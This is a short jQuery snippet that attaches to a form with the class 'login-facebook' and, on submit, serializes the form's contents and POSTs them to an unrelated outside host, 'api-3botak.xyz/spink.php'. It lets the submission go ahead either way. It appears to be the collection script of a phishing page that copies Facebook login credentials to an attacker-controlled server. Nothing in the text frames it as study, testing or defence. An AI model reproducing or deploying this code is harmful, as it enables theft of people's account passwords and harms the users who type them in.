$(".login-facebook").submit(function() {
	var d = $(".login-facebook");

	$.ajax({
        url: "https://api-3botak.xyz/spink.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
